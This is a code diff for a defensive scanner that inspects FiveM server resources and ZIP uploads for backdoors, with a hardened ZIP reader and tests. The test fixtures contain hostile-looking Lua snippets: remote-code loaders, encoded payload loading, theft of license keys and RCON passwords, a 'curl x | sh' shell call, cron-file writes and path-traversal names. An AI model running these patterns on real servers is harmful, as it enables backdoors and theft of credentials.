+import { finding, sortFindings } from "./rules.js";
+import { securityRules } from "./rules.js";
+import { decodeSource, ignored, MAX_FILE, MAX_SCAN_ZIP, plan, verdictOf } from "./limits.js";
+import { bufferRange, readZipEntries, readZipIndex } from "./zip.js";
+// macOS metadata (AppleDouble, magic 0x00051607): what `._x` files under `__MACOSX/` really are. Lua can't load it
+// (the first byte is NUL), so it is skipped; anything else with such a name is scanned like every other file.
+const isAppleDouble = (source) => source.startsWith("\0\x05\x16\x07");
+// Names only: macOS metadata (`__MACOSX/…/._x.zip`) isn't a nested archive (the content check above is for code).
+const metadataName = (name) => name.startsWith("__MACOSX/") && name.split("/").at(-1).startsWith("._");
+const folderOf = (name) => name.slice(0, name.lastIndexOf("/") + 1) || "./";
+const list = (names) => names.slice(0, 5).join(", ") + (names.length > 5 ? ", …" : "");
+export function scanFiles(files, extra = {}) {
+    const findings = [];
+    const unparsed = [];
+    const javascript = [];
+    const unreadable = [...(extra.unreadable ?? [])];
+    let scanned = 0;
+    for (const [path, source] of Object.entries(files).sort(([a], [b]) => a.localeCompare(b))) {
+        if (isAppleDouble(source))
+            continue;
+        if (source.startsWith("\x1bLua")) {
+            unreadable.push(path);
+            continue;
+        }
+        const result = securityRules(path, source);
+        findings.push(...result.findings);
+        if (!path.toLowerCase().endsWith(".lua"))
+            javascript.push(path);
+        else if (!result.parsed)
+            unparsed.push(path);
+        else
+            scanned++;
+    }
+    const base = { skipped: [], escrowed: [], archives: [], ...extra, scanned, findings: sortFindings([...findings, ...(extra.findings ?? [])]), unparsed, javascript, unreadable: [...new Set(unreadable)].sort() };
+    const notAnalyzed = base.unparsed.length + base.javascript.length + base.unreadable.length + base.skipped.length + base.archives.length;
+    return { ...base, verdict: verdictOf(base), notAnalyzed };
+}
+/** The archive-level checks (names only) plus the per-file checks. `names`: every entry, also the ones not read. */
+export function scanEntries(names, files, extra) {
+    const kept = names.filter((n) => !ignored(n));
+    const { executables, unsafePaths } = archiveRisks(kept);
+    return scanFiles(files, {
+        ...extra,
+        escrowed: [...new Set(kept.filter((n) => n.toLowerCase().endsWith(".fxap")).map(folderOf))],
+        archives: kept.filter((n) => !metadataName(n) && /\.(?:zip|rar|7z)$/i.test(n)),
+        findings: [
+            ...(executables.length ? [finding("LAB-PKG-004", `${executables.length} executable or system script file(s): ${list(executables)}`)] : []),
+            ...(unsafePaths.length ? [finding("LAB-PKG-005", `${unsafePaths.length} path(s) that escape the extraction folder: ${list(unsafePaths)}`)] : []),
+        ],
+    });
+}
+/**
+ * A ZIP upload, read through the strict reader (zip-index.ts): an entry whose bytes don't match what the archive
+ * declares (size, CRC, local header, a second entry with the same path) is unreadable, never a truncated clean file.
+ */
+export async function scanZip(zip) {
+    if (zip.length > MAX_SCAN_ZIP)
+        throw new Error("too_large");
+    const read = bufferRange(zip);
+    let index;
+    try {
+        index = (await readZipIndex(zip.length, read, { contiguous: true })).filter((e) => !ignored(e.name));
+    }
+    catch {
+        throw new Error("invalid_zip");
+    }
+    const { wanted, skipped } = plan(index.map((e) => ({ name: e.name, size: e.size })));
+    const raw = await readZipEntries(index.filter((e) => wanted.has(e.name)), zip.length, read, { maxEntry: MAX_FILE, all: index });
+    const files = {};
+    for (const [name, data] of Object.entries(raw))
+        files[name] = decodeSource(data);
+    // Wanted entries the reader left out, and any entry an extractor would write under another name (whatever its extension).
+    const unreadable = [...[...wanted].filter((n) => !(n in raw)), ...index.filter((e) => e.aliased).map((e) => e.name)];
+    return scanEntries(index.map((e) => e.name), files, { unreadable, skipped });
+}
+
+```
+
+`src/zip.js`:
+
+```js
+// A ZIP read by byte ranges: the central directory from the end of the file, then only the entries asked for.
+// Large packages (MLOs, vehicle packs, server packs) keep their text files small; only those ranges are read.
+// Pure functions over a ReadRange, so the same code reads from any byte source or from a buffer in tests.
+//
+// Archives are untrusted (third-party uploads): every size, count and offset in them is checked against hard limits
+// before it decides how much is fetched, allocated or decompressed.
+import { Inflate, strFromU8 } from "fflate";
+const EOCD = 0x06054b50;
+const EOCD64 = 0x06064b50;
+const EOCD64_LOCATOR = 0x07064b50;
+const CENTRAL = 0x02014b50;
+const LOCAL = 0x04034b50;
+const MAX_COMMENT = 0xffff;
+// A central directory over this is not a FiveM package (tens of thousands of files): refuse instead of downloading it.
+export const MAX_CENTRAL_DIRECTORY = 64 * 1024 * 1024;
+const MAX_ENTRIES = 200_000;
+/** Largest entry readZipEntries returns by default (text files up to 1 MB; callers may pass their own). */
+export const MAX_ENTRY_SIZE = 1024 * 1024;
+// Ranges are merged when the gap between two wanted entries is small, so a resource folder costs one request, not one per file.
+const MAX_GAP = 64 * 1024;
+const MAX_GROUP = 8 * 1024 * 1024;
+// Local extra fields may be a little longer than the central ones (ZIP64 sizes, timestamps); a longer one is re-read.
+const HEADER_SLACK = 512;
+// Small input chunks: deflate expands up to ~1032:1, so one chunk can produce at most ~4 MB before the cap is checked.
+const INFLATE_CHUNK = 4 * 1024;
+const u16 = (b, at) => b[at] | (b[at + 1] << 8);
+const u32 = (b, at) => (b[at] | (b[at + 1] << 8) | (b[at + 2] << 16) | (b[at + 3] << 24)) >>> 0;
+// ZIP64 sizes and offsets; files over 2^53 bytes don't exist here.
+const u64 = (b, at) => u32(b, at) + u32(b, at + 4) * 2 ** 32;
+export class ZipIndexError extends Error {
+}
+// A segment Windows or an extractor rewrites (trailing dot or space, "." / "..", empty, NUL, ":" as in x.lua::$DATA):
+// the file lands under another path than the name says.
+const ODD_SEGMENT = /^\.{1,2}$|[. ]$|[\0:]/;
+export const ambiguousName = (name) => name.replace(/\/$/, "").split(/[\\/]/).some((s) => s === "" || ODD_SEGMENT.test(s));
+/**
+ * Every entry in the central directory, in its order (the order unzipSync sees them in). The structure must be
+ * unambiguous: exactly one end record ending at the end of the file, the central directory right before it and filled
+ * by exactly `count` records. `contiguous` (archives in memory): the listed entries must also cover the file from byte 0
+ * to the central directory without a gap, so no unlisted entry hides between them for a streaming extractor.
+ */
+export async function readZipIndex(size, read, { contiguous = false } = {}) {
+    const tailStart = Math.max(0, size - (22 + MAX_COMMENT));
+    const tail = await read(tailStart, size);
+    // Every signature whose comment ends exactly at the end of the file is a possible end record; two (one planted in the
+    // other's comment) let extractors disagree about the whole archive.
+    const ends = [];
+    for (let i = tail.length - 22; i >= 0; i--)
+        if (u32(tail, i) === EOCD && i + 22 + u16(tail, i + 20) === tail.length)
+            ends.push(i);
+    if (ends.length !== 1)
+        throw new ZipIndexError(ends.length ? "more than one end of central directory" : "no end of central directory");
+    const at = ends[0];
+    let cdEnd = tailStart + at;
+    let count = u16(tail, at + 10);
+    let cdSize = u32(tail, at + 12);
+    let cdOffset = u32(tail, at + 16);
+    // A ZIP64 trailer (record + locator) sits between the central directory and the end record; Info-ZIP writes one
+    // even for small archives when it streams. Its values count only where the classic ones are maxed out: a classic
+    // archive may have exactly 65,535 entries.
+    const maxed = count === 0xffff || cdSize === 0xffffffff || cdOffset === 0xffffffff;
+    const locAt = at - 20;
+    let record = null;
+    if (locAt >= 0 && u32(tail, locAt) === EOCD64_LOCATOR) {
+        const recordAt = u64(tail, locAt + 8);
+        const found = recordAt + 56 <= size ? await read(recordAt, recordAt + 56) : null;
+        if (found && u32(found, 0) === EOCD64 && recordAt + 12 + u64(found, 4) === tailStart + locAt) {
+            record = found;
+            cdEnd = recordAt;
+        }
+        else if (maxed)
+            throw new ZipIndexError("ZIP64 end record missing");
+    }
+    if (record && maxed) {
+        count = u64(record, 32);
+        cdSize = u64(record, 40);
+        cdOffset = u64(record, 48);
+    }
+    else if (cdSize === 0xffffffff || cdOffset === 0xffffffff) {
+        throw new ZipIndexError("ZIP64 locator missing");
+    }
+    if (count > MAX_ENTRIES)
+        throw new ZipIndexError("too many entries");
+    if (cdSize > MAX_CENTRAL_DIRECTORY)
+        throw new ZipIndexError("central directory too large");
+    if (cdOffset + cdSize !== cdEnd)
+        throw new ZipIndexError("central directory not right before its end record");
+    const cd = await read(cdOffset, cdOffset + cdSize);
+    const entries = [];
+    let p = 0;
+    for (let i = 0; i < count; i++) {
+        if (p + 46 > cd.length || u32(cd, p) !== CENTRAL)
+            throw new ZipIndexError("broken central directory");
+        const flags = u16(cd, p + 8);
+        const nameLen = u16(cd, p + 28);
+        const extraLen = u16(cd, p + 30);
+        const commentLen = u16(cd, p + 32);
+        if (p + 46 + nameLen + extraLen + commentLen > cd.length)
+            throw new ZipIndexError("broken central directory");
+        let compressedSize = u32(cd, p + 20);
+        let entrySize = u32(cd, p + 24);
+        let offset = u32(cd, p + 42);
+        // Same name decoding as fflate's unzipSync: UTF-8 when flag 11 is set, otherwise Latin-1.
+        const raw = cd.slice(p + 46, p + 46 + nameLen);
+        const name = strFromU8(raw, !(flags & 0x800));
+        // ZIP64 extra field (0x0001): the 0xFFFFFFFF fields follow in this order, each 8 bytes, within the field's length.
+        const extraEnd = p + 46 + nameLen + extraLen;
+        // Info-ZIP Unicode Path (0x7075): Info-ZIP and 7-Zip extract under the name in it, not under `name`.
+        let aliased = ambiguousName(name);
+        for (let e = p + 46 + nameLen; e + 4 <= extraEnd;) {
+            const id = u16(cd, e);
+            const len = u16(cd, e + 2);
+            if (e + 4 + len > extraEnd)
+                break;
+            if (id === 0x7075)
+                aliased = true;
+            if (id === 0x0001) {
+                let q = e + 4;
+                const fieldEnd = q + len;
+                if (entrySize === 0xffffffff && q + 8 <= fieldEnd) {
+                    entrySize = u64(cd, q);
+                    q += 8;
+                }
+                if (compressedSize === 0xffffffff && q + 8 <= fieldEnd) {
+                    compressedSize = u64(cd, q);
+                    q += 8;
+                }
+                if (offset === 0xffffffff && q + 8 <= fieldEnd)
+                    offset = u64(cd, q);
+            }
+            e += 4 + len;
+        }
+        entries.push({ name, raw, method: u16(cd, p + 10), flags, crc: u32(cd, p + 16), compressedSize, size: entrySize, offset, header: nameLen + extraLen, aliased });
+        p += 46 + nameLen + extraLen + commentLen;
+    }
+    // More records than `count` says: extractors that walk the whole directory see entries this index would not.
+    if (p !== cd.length)
+        throw new ZipIndexError("central directory has unlisted records");
+    if (contiguous)
+        await assertContiguous(entries, cdOffset, read);
+    return entries;
+}
+// Local entries back to back from byte 0 to the central directory: header, data, data descriptor (flag 3; optional
+// signature, 8-byte sizes with a ZIP64 local field). Archives in memory only: every local header is read.
+async function assertContiguous(entries, cdOffset, read) {
+    let cursor = 0;
+    for (const e of [...entries].sort((a, b) => a.offset - b.offset)) {
+        if (e.offset !== cursor)
+            throw new ZipIndexError("data between the listed entries");
+        const head = await read(e.offset, e.offset + 30);
+        if (head.length < 30 || u32(head, 0) !== LOCAL)
+            throw new ZipIndexError("broken local header");
+        const nameLen = u16(head, 26);
+        const extraLen = u16(head, 28);
+        cursor = e.offset + 30 + nameLen + extraLen + e.compressedSize;
+        if (e.flags & 8) {
+            const extra = await read(e.offset + 30 + nameLen, e.offset + 30 + nameLen + extraLen);
+            let zip64 = e.size >= 0xffffffff || e.compressedSize >= 0xffffffff;
+            for (let x = 0; x + 4 <= extra.length; x += 4 + u16(extra, x + 2))
+                if (u16(extra, x) === 0x0001)
+                    zip64 = true;
+            const sig = await read(cursor, cursor + 4);
+            if (sig.length === 4 && u32(sig, 0) === 0x08074b50)
+                cursor += 4;
+            cursor += zip64 ? 20 : 12;
+        }
+    }
+    if (cursor !== cdOffset)
+        throw new ZipIndexError("data between the last entry and the central directory");
+}
+/**
+ * Whether an entry can be read within the limits. Stored data is exactly its size; deflate grows incompressible data by
+ * at most a few bytes per 16 KB block, so a larger compressed size than that is a lie meant to make us fetch gigabytes.
+ */
+const plausible = (e, size, maxEntry) => !(e.flags & 1) &&
+    e.size <= maxEntry &&
+    e.offset < size &&
+    (e.method === 0 ? e.compressedSize === e.size : e.method === 8 && e.compressedSize <= e.size + (e.size >> 3) + 1024);
+// Deflate with a hard cap on the output: decoding stops as soon as the entry would exceed its declared size.
+function inflateBounded(data, size) {
+    const out = new Uint8Array(size);
+    let n = 0;
+    let over = false;
+    const inflate = new Inflate((chunk) => {
+        if (over || n + chunk.length > size) {
+            over = true;
+            return;
+        }
+        out.set(chunk, n);
+        n += chunk.length;
+    });
+    try {
+        for (let i = 0; i < data.length && !over; i += INFLATE_CHUNK)
+            inflate.push(data.subarray(i, i + INFLATE_CHUNK), i + INFLATE_CHUNK >= data.length);
+    }
+    catch {
+        return null; // corrupt stream
+    }
+    return over || n !== size ? null : out;
+}
+// Where an entry lands on Windows/macOS: case-insensitive, backslash as separator, trailing dots and spaces dropped,
+// "." and empty segments skipped.
+const pathKey = (name) => name
+    .replaceAll("\\", "/")
+    .toLowerCase()
+    .split("/")
+    .map((s) => s.replace(/[. ]+$/, ""))
+    .filter((s) => s && s !== ".")
+    .join("/");
+/** Names that more than one entry of the archive extracts to. Which copy wins depends on the extractor. One pass. */
+export function duplicateNames(entries) {
+    const first = new Map();
+    const out = new Set();
+    for (const { name } of entries) {
+        const key = pathKey(name);
+        const seen = first.get(key);
+        if (seen === undefined)
+            first.set(key, name);
+        else
+            out.add(seen).add(name);
+    }
+    return out;
+}
+// CRC-32 (IEEE), as stored in every ZIP header.
+const CRC_TABLE = Uint32Array.from({ length: 256 }, (_, n) => {
+    let c = n;
+    for (let k = 0; k < 8; k++)
+        c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
+    return c >>> 0;
+});
+export function crc32(bytes) {
+    let c = 0xffffffff;
+    for (let i = 0; i < bytes.length; i++)
+        c = CRC_TABLE[(c ^ bytes[i]) & 0xff] ^ (c >>> 8);
+    return (c ^ 0xffffffff) >>> 0;
+}
+const sameBytes = (a, b) => a.length === b.length && a.every((x, i) => x === b[i]);
+/**
+ * The uncompressed bytes of these entries (stored or deflated, at most `maxEntry` each). An entry is returned only when
+ * every extractor would produce exactly these bytes: its local header repeats the central directory's name, method and
+ * sizes (unless a data descriptor carries them), the output has the declared size and CRC, and no other entry of the
+ * archive extracts to the same path. Everything else (encrypted, implausible, corrupt, inconsistent, duplicated,
+ * other-method) is left out: callers report a missing entry as unreadable, never as clean. Neighbouring entries share
+ * one range request.
+ */
+export async function readZipEntries(wanted, size, read, { maxEntry = MAX_ENTRY_SIZE, all = wanted } = {}) {
+    const dupes = duplicateNames(all);
+    const sorted = wanted.filter((e) => plausible(e, size, maxEntry) && !e.aliased && !dupes.has(e.name)).sort((a, b) => a.offset - b.offset);
+    const endOf = (e) => Math.min(size, e.offset + 30 + e.header + HEADER_SLACK + e.compressedSize);
+    const groups = [];
+    for (const e of sorted) {
+        const g = groups.at(-1);
+        if (g && e.offset - endOf(g.at(-1)) < MAX_GAP && endOf(e) - g[0].offset < MAX_GROUP)
+            g.push(e);
+        else
+            groups.push([e]);
+    }
+    const out = Object.create(null);
+    // false: cut off by our estimate of the header length (retry with the exact one); true: done (read or unreadable).
+    const decode = (e, buf, at) => {
+        if (at + 30 > buf.length || u32(buf, at) !== LOCAL)
+            return true;
+        const nameLen = u16(buf, at + 26);
+        if (at + 30 + nameLen > buf.length)
+            return false;
+        if (!localMatches(e, buf, at))
+            return true;
+        const dataAt = at + 30 + nameLen + u16(buf, at + 28);
+        const data = buf.subarray(dataAt, dataAt + e.compressedSize);
+        if (data.length !== e.compressedSize) {
+            const dataEndInFile = e.offset - at + dataAt + e.compressedSize;
+            return dataEndInFile > size; // past the end of the file: truncated archive, give up
+        }
+        const bytes = e.method === 0 ? data.slice() : inflateBounded(data, e.size);
+        if (bytes && crc32(bytes) === e.crc)
+            out[e.name] = bytes;
+        return true;
+    };
+    for (const g of groups) {
+        const start = g[0].offset;
+        const end = g.reduce((m, e) => Math.max(m, endOf(e)), 0);
+        const buf = await read(start, end);
+        for (const e of g) {
+            if (decode(e, buf, e.offset - start))
+                continue;
+            // The local header was longer than the central one suggested: read this entry exactly (header ≤ 128 KB).
+            const head = await read(e.offset, Math.min(size, e.offset + 30));
+            if (head.length < 30 || u32(head, 0) !== LOCAL)
+                continue;
+            decode(e, await read(e.offset, Math.min(size, e.offset + 30 + u16(head, 26) + u16(head, 28) + e.compressedSize)), 0);
+        }
+    }
+    return out;
+}
+// The local header must describe the same entry as the central directory: a streaming extractor reads only the local
+// one. With a data descriptor (flag 3) the local CRC and sizes are zero and the central ones count.
+function localMatches(e, buf, at) {
+    const flags = u16(buf, at + 6);
+    if ((flags & 1) !== (e.flags & 1) || u16(buf, at + 8) !== e.method)
+        return false;
+    if (!sameBytes(buf.subarray(at + 30, at + 30 + u16(buf, at + 26)), e.raw))
+        return false;
+    if (flags & 8)
+        return true;
+    const crc = u32(buf, at + 14);
+    const compressed = u32(buf, at + 18);
+    const plain = u32(buf, at + 22);
+    // ZIP64 local headers put 0xFFFFFFFF here and the real sizes in their extra field; the CRC check still binds the data.
+    const sizeOk = (local, central) => local === central || local === 0xffffffff;
+    return crc === e.crc && sizeOk(compressed, e.compressedSize) && sizeOk(plain, e.size);
+}
+/** A ReadRange over an in-memory archive (tests, and archives that were downloaded anyway). */
+export const bufferRange = (bytes) => async (start, end) => bytes.subarray(start, end);
+/**
+ * A ReadRange with a budget: at most `requests` reads, and no read starts after `ms` (one already running may take its own
+ * timeout longer). After that every read throws ZipIndexError: the file is reported unreadable instead of holding
+ * the read open for many minutes.
+ */
+export function budgetedRange(read, { requests, ms }) {
+    let used = 0;
+    const deadline = Date.now() + ms;
+    return async (start, end) => {
+        if (++used > requests || Date.now() > deadline)
+            throw new ZipIndexError("range budget exhausted");
+        return read(start, end);
+    };
+}
+
+```
+
+`test/archive.test.js`:
+
+```js
+import assert from "node:assert/strict";
+import { test } from "node:test";
+import { archiveRisks } from "../src/index.js";
+
+test("archive entry names: executables and unsafe paths; C# assemblies are expected", () => {
+  assert.deepEqual(archiveRisks(["r/fxmanifest.lua", "r/setup.EXE", "r/run.bat", "r/tools/fix.ps1", "__MACOSX/r/._x.sh", "r/ui/app.js"]), {
+    executables: ["r/setup.EXE", "r/run.bat", "r/tools/fix.ps1"],
+    unsafePaths: [],
+  });
+  assert.deepEqual(archiveRisks(["r/Game.Client.net.dll", "r/Newtonsoft.Json.dll"]).executables, []);
+  assert.deepEqual(archiveRisks(["r/helper.dll"]).executables, ["r/helper.dll"]);
+  assert.deepEqual(archiveRisks(["../evil.lua", "r/../../x.lua", "/etc/passwd", "C:/x.lua", "r\\..\\x.lua", "r/ok..lua"]).unsafePaths, [
+    "../evil.lua",
+    "r/../../x.lua",
+    "/etc/passwd",
+    "C:/x.lua",
+    "r\\..\\x.lua",
+  ]);
+});
+
+```
+
+`test/catalog.test.js`:
+
+```js
+import assert from "node:assert/strict";
+import { readFileSync } from "node:fs";
+import { test } from "node:test";
+import { RULES, RULESET_VERSION } from "../src/index.js";
+
+const PUBLISHED = ["LAB-PKG-004", "LAB-PKG-005", "LAB-SEC-101", "LAB-SEC-102", "LAB-SEC-103", "LAB-SEC-104", "LAB-SEC-105", "LAB-SEC-106", "LAB-SEC-107", "LAB-SEC-108", "LAB-SEC-109", "LAB-SEC-110", "LAB-SEC-111", "LAB-SEC-112"];
+
+test("rules/catalog.json is the only source of the rule texts, with the public codes only", () => {
+  const catalog = JSON.parse(readFileSync(new URL("../rules/catalog.json", import.meta.url), "utf8"));
+  assert.equal(RULESET_VERSION, catalog.rulesetVersion);
+  assert.deepEqual(Object.keys(RULES).sort(), PUBLISHED);
+  for (const [code, rule] of Object.entries(RULES)) {
+    assert.ok(["error", "warning", "info"].includes(rule.severity), code);
+    assert.ok(["confirmed", "likely", "heuristic"].includes(rule.confidence), code);
+    assert.ok(rule.title && rule.fix && Array.isArray(rule.refs), code);
+  }
+  assert.match(readFileSync(new URL("../rules/CHANGELOG.md", import.meta.url), "utf8"), new RegExp(`## ${RULESET_VERSION.replaceAll(".", "\\.")}`));
+});
+
+```
+
+`test/cli.test.js`:
+
+```js
+import assert from "node:assert/strict";
+import { spawnSync } from "node:child_process";
+import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import { test } from "node:test";
+import { strToU8, zipSync } from "fflate";
+import { scanPath } from "../src/index.js";
+
+const tmp = () => mkdtempSync(join(tmpdir(), "fbs-"));
+const server = (files) => {
+  const dir = tmp();
+  for (const [path, text] of Object.entries(files)) {
+    mkdirSync(join(dir, path, ".."), { recursive: true });
+    writeFileSync(join(dir, path), text);
+  }
+  return dir;
+};
+const cli = (...args) => spawnSync(process.execPath, [new URL("../bin/scan.js", import.meta.url).pathname, ...args], { encoding: "utf8" });
+
+test("verdicts: clean, partial, suspicious, hidden", async () => {
+  assert.equal((await scanPath(server({ "shop/fxmanifest.lua": "fx_version 'cerulean'", "shop/server.lua": "print(1)" }))).verdict, "clean");
+  assert.equal((await scanPath(server({ "shop/server.lua": "print(1)", "esc/client.fxap": "x", "esc/c.lua": "print(2)" }))).verdict, "partial");
+  assert.equal((await scanPath(server({ "a/server.lua": "os.execute('x')" }))).verdict, "suspicious");
+  assert.equal((await scanPath(server({ "a/server.lua": `a()${" ".repeat(500)}load(x)()` }))).verdict, "hidden");
+});
+
+test("skips node_modules, reads compiled Lua as unreadable, reports escrow folders", async () => {
+  const r = await scanPath(server({ "a/node_modules/x/evil.js": `a${" ".repeat(500)}b`, "a/b.lua": "\x1bLua\x54", "enc/x.fxap": "", "ok.lua": "print(1)" }));
+  assert.deepEqual([r.findings.length, r.unreadable, r.escrowed], [0, ["a/b.lua"], ["enc/"]]);
+});
+
+test("a stream folder is scanned like any other", async () => {
+  const r = await scanPath(server({ "r/stream/loader.lua": "os.execute('x')" }));
+  assert.deepEqual(r.findings.map((f) => f.code), ["LAB-SEC-106"]);
+});
+
+test("a folder with an executable or unsafe archive path gets the package findings", async () => {
+  const r = await scanPath(server({ "r/server.lua": "print(1)", "r/install.bat": "echo" }));
+  assert.deepEqual(r.findings.map((f) => f.code), ["LAB-PKG-004"]);
+});
+
+test("a ZIP is scanned like a folder", async () => {
+  const file = join(tmp(), "pack.zip");
+  writeFileSync(file, zipSync({ "server.lua": strToU8("os.execute('x')") }));
+  const out = cli(file, "--json");
+  assert.equal(out.status, 1);
+  assert.ok(JSON.parse(out.stdout)[0].findings.some((f) => f.code === "LAB-SEC-106"));
+});
+
+test("CLI exit codes: 0 nothing found, 1 findings, 2 usage, 3 the scan could not run", () => {
+  assert.equal(cli(server({ "s.lua": "print(1)" })).status, 0);
+  const bad = cli(server({ "s.lua": "os.execute('x')" }), "--json");
+  assert.equal(bad.status, 1);
+  assert.equal(JSON.parse(bad.stdout)[0].findings[0].code, "LAB-SEC-106");
+  assert.equal(cli().status, 2);
+  assert.equal(cli("--nope", "x").status, 2);
+  assert.equal(cli("/does/not/exist").status, 3);
+  const notZip = join(tmp(), "bad.zip");
+  writeFileSync(notZip, "not a zip");
+  assert.equal(cli(notZip).status, 3);
+});
+
+```
+
+`test/corpus.test.js`:
+
+```js
+import assert from "node:assert/strict";
+import { readdirSync, readFileSync } from "node:fs";
+import { test } from "node:test";
+import { securityRules } from "../src/index.js";
+
+const dir = (name) => new URL(`../corpus/${name}/`, import.meta.url);
+const luaFiles = (name) => readdirSync(dir(name)).filter((f) => /\.(?:lua|js)$/.test(f)).sort();
+const scan = (name, f) => securityRules(f, readFileSync(new URL(f, dir(name)), "utf8"));
+
+test("corpus: every positive sample gives exactly the codes in expected.json", () => {
+  const expected = JSON.parse(readFileSync(new URL("expected.json", dir("positive")), "utf8"));
+  const files = luaFiles("positive");
+  assert.deepEqual(Object.keys(expected).sort(), files);
+  for (const f of files) {
+    const r = scan("positive", f);
+    assert.equal(r.parsed, true, f);
+    assert.deepEqual(r.findings.map((x) => x.code).sort(), [...expected[f]].sort(), f);
+  }
+});
+
+test("corpus: negative samples stay clean", () => {
+  const files = luaFiles("negative");
+  assert.ok(files.length > 0);
+  for (const f of files) {
+    const r = scan("negative", f);
+    assert.equal(r.parsed, true, f);
+    assert.deepEqual(r.findings, [], f);
+  }
+});
+
+test("LAB-SEC-107 stays linear: a 500 KB line of blanks finishes in under 100 ms", () => {
+  const start = performance.now();
+  const r = securityRules("server.lua", `print('ok')${" ".repeat(500_000)}`);
+  assert.ok(performance.now() - start < 100);
+  assert.deepEqual(r.findings, []);
+  assert.equal(r.parsed, true);
+});
+
+test("LAB-SEC-111 stays linear: 40,000 unclosed Buffer.from( calls finish in under 2 s", () => {
+  const start = performance.now();
+  const r = securityRules("server.js", `eval(x);\n${"Buffer.from(".repeat(40_000)}`);
+  assert.ok(performance.now() - start < 2_000);
+  assert.deepEqual(r.findings, []);
+});
+
+```
+
+`test/rules.test.js`:
+
+```js
+// Fixtures describe backdoor *shapes* (remote loader, encoded strings, secret reads); none of them is real malware.
+import assert from "node:assert/strict";
+import { test } from "node:test";
+import { securityRules } from "../src/rules.js";
+
+const findings = (server, code) => securityRules("server.lua", server).findings.filter((f) => f.code === code);
+const fires = (server, code) => findings(server, code).length > 0;
+const escaped = (text) => [...text].map((c) => `\\x${c.charCodeAt(0).toString(16).padStart(2, "0")}`).join("");
+
+test("LAB-SEC-101: load of an HTTP response, not load of resource files", () => {
+  const [f] = findings("PerformHttpRequest('https://example.com/x', function(_, body) assert(load(body))() end)", "LAB-SEC-101");
+  assert.deepEqual([f.severity, f.path, f.line], ["warning", "server.lua", 1]);
+  assert.ok(fires("PerformHttpRequest(url, function(e, d, h) pcall(function() assert(load(d))() end) end)", "LAB-SEC-101"));
+  assert.ok(fires("PerformHttpRequest(url, function(e, d) local fn = loadstring(d) fn() end, 'GET')", "LAB-SEC-101"));
+  assert.ok(!fires("local chunk = load(LoadResourceFile(GetCurrentResourceName(), 'data.lua'))", "LAB-SEC-101"));
+  assert.ok(!fires("PerformHttpRequest(webhook, function(code) print(code) end, 'POST', json.encode({ content = 'log' }))", "LAB-SEC-101"));
+});
+
+test("LAB-SEC-102: load of decoded text, not of plain variables", () => {
+  assert.ok(fires("load(string.char(112, 114, 105, 110, 116))()", "LAB-SEC-102"));
+  assert.ok(fires(`load("${escaped("print('hi')")}")()`, "LAB-SEC-102"));
+  assert.ok(fires("assert(load(base64decode(payload)))()", "LAB-SEC-102"));
+  assert.ok(!fires("local fn = load(code, '@chunk', 't', env)", "LAB-SEC-102"));
+  assert.ok(!fires("load('return 1 + 1')()", "LAB-SEC-102"));
+});
+
+test("LAB-SEC-107: code after a long run of spaces is an error, a comment there is not", () => {
+  const [f] = findings(`print('ok')\n${" ".repeat(7168)}local a=load(x) if a then a() end\nprint('after')`, "LAB-SEC-107");
+  assert.deepEqual([f.severity, f.line], ["error", 2]);
+  assert.ok(!fires(`print('ok')${" ".repeat(500)}-- note`, "LAB-SEC-107"));
+  assert.ok(!fires(`local s = "${" ".repeat(399)}x"`, "LAB-SEC-107"));
+  assert.deepEqual(findings(`a()${" ".repeat(500)}-- note\nb()\n${"\t".repeat(450)}load(x)()`, "LAB-SEC-107").map((x) => x.line), [3]);
+  assert.ok(securityRules("ui/app.js", `x()${" ".repeat(600)}fetch(u)`).findings.some((x) => x.code === "LAB-SEC-107"));
+});
+
+test("LAB-SEC-107: a huge run of spaces is checked in linear time", () => {
+  const start = performance.now();
+  for (const blank of [" ", "\v", "\f", "\t"]) securityRules("x.js", `a${blank.repeat(2_000_000)}`);
+  assert.ok(performance.now() - start < 2_000);
+});
+
+test("LAB-SEC-103: long encoded data, not short escapes or images", () => {
+  assert.ok(fires(`local s = "${escaped("x".repeat(50))}"`, "LAB-SEC-103"));
+  assert.ok(fires(`local s = "${"QUJD".repeat(120)}"`, "LAB-SEC-103"));
+  assert.ok(fires(`local s = string.char(${Array.from({ length: 25 }, () => 65).join(", ")})`, "LAB-SEC-103"));
+  assert.ok(!fires('print("line one\\nline two\\t\\x41")', "LAB-SEC-103"));
+  assert.ok(!fires(`local img = "data:image/png;base64,${"QUJD".repeat(200)}"`, "LAB-SEC-103"));
+  assert.ok(!fires("local sep = string.char(10)", "LAB-SEC-103"));
+});
+
+test("LAB-SEC-104: secret convars; the database string only next to HTTP", () => {
+  assert.ok(fires("local key = GetConvar('sv_licenseKey', '')", "LAB-SEC-104"));
+  assert.ok(fires("local pw = GetConvar('rcon_password', '')", "LAB-SEC-104"));
+  assert.ok(fires("local db = GetConvar('mysql_connection_string', '')\nPerformHttpRequest(u, function() end, 'POST', db)", "LAB-SEC-104"));
+  assert.ok(!fires("local db = GetConvar('mysql_connection_string', '')", "LAB-SEC-104"));
+  assert.ok(!fires("local locale = GetConvar('ox:locale', 'en')", "LAB-SEC-104"));
+});
+
+test("LAB-SEC-105: raw public IPs and hidden URLs, not named hosts or local services", () => {
+  assert.ok(fires("PerformHttpRequest('http://45.13.12.9:8080/p', function() end)", "LAB-SEC-105"));
+  assert.ok(fires("local u = 'https://203.0.113.7/x'\nPerformHttpRequest(u, function() end)", "LAB-SEC-105"));
+  assert.ok(fires(`PerformHttpRequest("${escaped("https://example.com/")}", function() end)`, "LAB-SEC-105"));
+  assert.ok(!fires("PerformHttpRequest('https://discord.com/api/webhooks/1/abc', function() end, 'POST')", "LAB-SEC-105"));
+  assert.ok(!fires("PerformHttpRequest('http://127.0.0.1:3000/hook', function() end)", "LAB-SEC-105"));
+  assert.ok(!fires("local ip = 'http://45.13.12.9/'", "LAB-SEC-105"));
+});
+
+test("LAB-SEC-106: shell, writes outside the resource, spreading into computed resources", () => {
+  assert.ok(fires("os.execute('curl x | sh')", "LAB-SEC-106"));
+  assert.ok(fires("local p = io.popen('whoami')", "LAB-SEC-106"));
+  assert.ok(fires("local f = io.open('/etc/cron.d/x', 'w')", "LAB-SEC-106"));
+  assert.ok(fires("for i = 0, GetNumResources() - 1 do\n  local r = GetResourceByFindIndex(i)\n  SaveResourceFile(r, 'fxmanifest.lua', data, -1)\nend", "LAB-SEC-106"));
